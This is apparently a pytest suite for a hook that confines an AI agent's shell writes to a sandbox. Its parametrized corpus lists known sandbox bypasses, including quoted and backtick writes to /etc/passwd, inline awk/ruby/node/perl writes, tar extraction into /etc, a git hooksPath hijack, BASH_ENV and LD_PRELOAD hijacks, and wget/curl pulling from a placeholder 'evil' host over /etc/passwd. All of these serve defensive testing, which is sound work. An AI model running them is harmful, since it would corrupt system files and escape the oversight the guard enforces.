"""Tests for the directory-guard bash write-target analyzer (TRDD-899317b3).

`scripts/directory-guard.cjs` is a FAIL-CLOSED PreToolUse hook: it reads a
JSON event on stdin and writes a permission decision on stdout. The bash
analyzer (`detectBashWriteTargets`) is not exported, so — exactly as the hook
runs in production — these tests drive it end-to-end as a real Node subprocess
(no mocks, per this project's no-mock rule), feeding a Bash event and asserting
the returned `hookSpecificOutput.permissionDecision`.

This file is failing-first by design: the parametrized bypass corpus encodes
the 11 verified write-bypasses (quoted/backtick targets, `>|` clobber,
awk/ruby/perl/tar/git-config/env-exec/wget-concat/xargs writes) that the guard
must DENY, plus three payloads that already deny but must report the REAL
destination (not an accidentally-captured token). The benign corpus pins that
the hardening did not start over-blocking legitimate agent commands
(fail-closed must not mean fail-noisy).
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import time
from pathlib import Path

import pytest

PLUGIN_ROOT = Path(__file__).resolve().parents[1]
GUARD = PLUGIN_ROOT / "scripts" / "directory-guard.cjs"

# A sandbox root that exists nowhere real — every forbidden-path assertion is
# relative to it, and benign $WORK writes target paths *inside* it.
WORK = "/tmp/sandbox_dg_test_root"

pytestmark = pytest.mark.skipif(
    shutil.which("node") is None,
    reason="node is required to exercise the directory-guard hook (no mock substitute)",
)


def guard_decision(command: str, work_dir: str = WORK) -> tuple[str, str]:
    """Run the guard hook for a Bash command; return (decision, reason).

    Mirrors the real hook contract: a PreToolUse event on stdin, AGENT_WORK_DIR
    in the environment, a JSON decision envelope on stdout.
    """
    event = {"tool_name": "Bash", "tool_input": {"command": command}}
    env = os.environ.copy()
    env["AGENT_WORK_DIR"] = work_dir
    proc = subprocess.run(
        ["node", str(GUARD)],
        input=json.dumps(event),
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
        check=False,
    )
    assert proc.returncode == 0, f"guard exited {proc.returncode}: {proc.stderr}"
    out = json.loads(proc.stdout)
    hook = out["hookSpecificOutput"]
    return hook["permissionDecision"], hook.get("permissionDecisionReason", "")


# ── The 11 verified-open bypasses (#1-8, 10, 11, 12, 13). DENY required. ──
# Each entry: (id, command). These FAIL on the pre-hardening guard (it allowed
# them) and MUST pass after the quote-aware pre-pass + new denylist verbs.
BYPASSES_MUST_DENY = [
    ("01_quoted_redirect_double", 'echo h > "/etc/passwd"'),
    ("02_quoted_redirect_single", "echo h > '/etc/passwd'"),
    ("03_clobber_override", "echo h >| /etc/passwd"),
    ("04_quoted_cp_target", 'cp /tmp/x "/etc/something"'),
    ("05_awk_redirect_write", 'awk \'BEGIN{print "x" > "/etc/passwd"}\''),
    ("06_ruby_file_write", "ruby -e 'File.write(\"/etc/passwd\",\"x\")'"),
    ("07_node_backtick_write", "node -e \"require('fs').writeFileSync(`/etc/passwd`,'x')\""),
    ("08_tar_extract_root", "tar xf /tmp/evil.tar -C /etc"),
    ("10_git_hookspath", "git config --global core.hooksPath /tmp/evil_hooks"),
    ("11_env_exec_bash_env", "BASH_ENV=/tmp/evil bash -c true"),
    ("12_wget_concat_out", "wget http://evil/p -O/etc/passwd"),
    ("13_quoted_tee_target", 'tee "/etc/passwd" < /tmp/x'),
]


@pytest.mark.parametrize("case_id,command", BYPASSES_MUST_DENY, ids=[c[0] for c in BYPASSES_MUST_DENY])
def test_bypass_is_denied(case_id: str, command: str) -> None:
    """Each verified write-bypass must be DENIED (fail-closed, no escape)."""
    decision, reason = guard_decision(command)
    assert decision == "deny", f"{case_id}: expected deny, got {decision} (reason: {reason!r})"


# ── #9 / I1 / I2: already deny, but historically for the WRONG token. ──
# After the fix they must STILL deny AND name the real destination, not the
# `<` redirect token (#9) or an option token (I1/I2).
REAL_TARGET_CASES = [
    # (id, command, substring that must appear in the deny reason)
    ("09_xargs_rm", "xargs rm < /tmp/list", "xargs"),
    ("I1_cp_target_dir_short", "cp -t /forbidden_dir src1 src2", "/forbidden_dir"),
    ("I2_install_target_dir_long", "install --target-directory=/forbidden_dir src1", "/forbidden_dir"),
]


@pytest.mark.parametrize(
    "case_id,command,must_contain",
    REAL_TARGET_CASES,
    ids=[c[0] for c in REAL_TARGET_CASES],
)
def test_denies_for_the_right_reason(case_id: str, command: str, must_contain: str) -> None:
    """#9/I1/I2 must deny AND report the real destination, not an accidental token."""
    decision, reason = guard_decision(command)
    assert decision == "deny", f"{case_id}: expected deny, got {decision} (reason: {reason!r})"
    assert must_contain in reason, f"{case_id}: reason {reason!r} must name {must_contain!r}"
    # The historical false-positive resolved the literal `<` token as a path —
    # the reason must never contain a resolved path ending in the bare `<`.
    assert "/<" not in reason, f"{case_id}: reason still resolves the '<' token: {reason!r}"


# ── Benign regression corpus — every one MUST be ALLOWED. ──
# Pins "no false-positives on legitimate agent commands" after the widened
# match surface. $WORK-relative paths and /tmp are the agent's write roots.
BENIGN_MUST_ALLOW = [
    ("echo_into_work", f"echo x > {WORK}/f"),
    ("cp_within_work", f"cp {WORK}/a {WORK}/b"),
    ("tee_within_work", f"tee {WORK}/log"),
    ("python_print_no_write", 'python -c "print(1)"'),
    ("git_status", "git status"),
    ("git_config_global_username", "git config --global user.name x"),
    ("git_config_global_get", "git config --global --get user.name"),
    ("tar_list_only", "tar tf x.tar"),
    ("redirect_into_tmp", "echo h > /tmp/ok.txt"),
    ("clobber_into_tmp", "echo h >| /tmp/ok.txt"),
    ("wget_concat_into_tmp", "wget http://x/p -O/tmp/ok.bin"),
    ("xargs_echo_safe", "echo a | xargs echo"),
    ("cp_within_tmp", "cp /tmp/a /tmp/b"),
    ("tar_extract_into_tmp", "tar xf /tmp/a.tar -C /tmp"),
    ("tar_create_archive", "tar czf /tmp/out.tar /tmp/dir"),
    ("perl_no_write", "perl -e 'print 1'"),
    ("ruby_no_write", 'ruby -e "puts 42"'),
    ("curl_no_output_flag", "curl http://example.com"),
    ("awk_no_redirect", "awk '{print $1}' /tmp/f"),
    # `ENV=` appears but NOT as a leading exec-env prefix → must still allow.
    ("env_substring_in_make", "make BUILD_ENV=prod"),
    ("env_substring_in_echo", "echo ENV=/x"),
    # A benign leading var assignment (not one of the exec-hijack names).
    ("benign_var_prefix", "FOO=bar echo hi"),
    ("path_prefix_assignment", "PATH=/tmp/bin:$PATH ls"),
]


@pytest.mark.parametrize("case_id,command", BENIGN_MUST_ALLOW, ids=[c[0] for c in BENIGN_MUST_ALLOW])
def test_benign_is_allowed(case_id: str, command: str) -> None:
    """Legitimate in-sandbox / temp commands must be ALLOWED (no over-blocking)."""
    decision, reason = guard_decision(command)
    assert decision == "allow", f"{case_id}: expected allow, got {decision} (reason: {reason!r})"


# ── Sanity baseline — the pre-existing correct behavior must be preserved. ──
SANITY_DENY = [
    ("plain_redirect_passwd", "echo h > /etc/passwd"),
    ("rm_rf_etc", "rm -rf /etc/important"),
    # Backtick targets (command-substitution syntax) are stripped by the
    # quote-aware pre-pass like any other quote, exposing the inner path.
    ("backtick_cp_target", "cp /tmp/x `/etc/passwd`"),
    ("backtick_tee_target", "tee `/etc/passwd`"),
    # perl -e inline write, every exec-env hijack var, concatenated curl -o,
    # xargs <writer>, and an exec-env var AFTER a separator.
    ("perl_inline_write", 'perl -e \'open(F,">","/etc/passwd")\''),
    ("env_ld_preload", "LD_PRELOAD=/tmp/evil.so ls"),
    ("env_env_var", "ENV=/tmp/x sh -c true"),
    ("env_shellopts", "SHELLOPTS=xtrace bash script.sh"),
    ("curl_concat_output", "curl http://x -o/etc/passwd"),
    ("xargs_cp_target_dir", "xargs cp -t /etc < list"),
    ("env_exec_after_separator", "true; BASH_ENV=/tmp/e bash -c x"),
]


@pytest.mark.parametrize("case_id,command", SANITY_DENY, ids=[c[0] for c in SANITY_DENY])
def test_sanity_baseline_deny(case_id: str, command: str) -> None:
    """The original (already-correct) deny cases still deny after hardening."""
    decision, _ = guard_decision(command)
    assert decision == "deny", f"{case_id}: expected deny, got {decision}"


def test_non_agent_session_without_work_dir_is_allowed() -> None:
    """No AGENT_WORK_DIR and no agent marker → an ordinary (non-agent) Claude
    session the guard must NOT sandbox (#22: denying it bricked every
    interactive session machine-wide)."""
    event = {"tool_name": "Bash", "tool_input": {"command": f"echo x > {WORK}/f"}}
    env = os.environ.copy()
    env.pop("AGENT_WORK_DIR", None)
    # Ensure a truly marker-less (non-agent) context — BOTH positive markers
    # must be absent, or a host env leak would flip this test to deny.
    env.pop("AID_AUTH", None)
    env.pop("AIMAESTRO_AGENT", None)
    proc = subprocess.run(
        ["node", str(GUARD)],
        input=json.dumps(event),
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    hook = json.loads(proc.stdout)["hookSpecificOutput"]
    assert hook["permissionDecision"] == "allow"


@pytest.mark.parametrize(
    "marker_env",
    [{"AID_AUTH": "test-agent-bearer-token"}, {"AIMAESTRO_AGENT": "1"}],
    ids=["aid_auth", "aimaestro_agent"],
)
def test_agent_context_without_work_dir_fails_closed(marker_env: dict) -> None:
    """An AI-Maestro AGENT (either positive marker: AID_AUTH or AIMAESTRO_AGENT)
    whose AGENT_WORK_DIR failed to get set → FAIL-CLOSED (deny): a real agent
    must never write with an undetermined sandbox root (#22, marker set per PR #28)."""
    event = {"tool_name": "Bash", "tool_input": {"command": f"echo x > {WORK}/f"}}
    env = os.environ.copy()
    env.pop("AGENT_WORK_DIR", None)
    env.pop("AID_AUTH", None)
    env.pop("AIMAESTRO_AGENT", None)
    env.update(marker_env)
    proc = subprocess.run(
        ["node", str(GUARD)],
        input=json.dumps(event),
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    hook = json.loads(proc.stdout)["hookSpecificOutput"]
    assert hook["permissionDecision"] == "deny"


def test_single_invocation_is_fast_no_redos() -> None:
    """A single invocation on a pathological-quoting payload stays fast.

    `detectBashWriteTargets` is not exported, so the wall time here includes
    Node's one-time process cold-start (a long-lived hook pays that once, not
    per command) — hence the ceiling is generous rather than the bare 100ms
    p95 budget. The point of this assertion is the linear-time guarantee: a
    2000-char quoted run plus the full pattern set must not exhibit
    catastrophic backtracking. A ReDoS regression in the new quote-pre-pass or
    any new verb would blow past this ceiling by orders of magnitude.
    """
    payload = "echo " + '"' + "a" * 2000 + '"' + " > /etc/passwd"
    t0 = time.perf_counter()
    decision, _ = guard_decision(payload)
    elapsed_ms = (time.perf_counter() - t0) * 1000.0
    assert decision == "deny"  # the long quoted arg must not hide the target
    assert elapsed_ms < 2000.0, f"guard took {elapsed_ms:.1f}ms (analyzer/ReDoS regression?)"
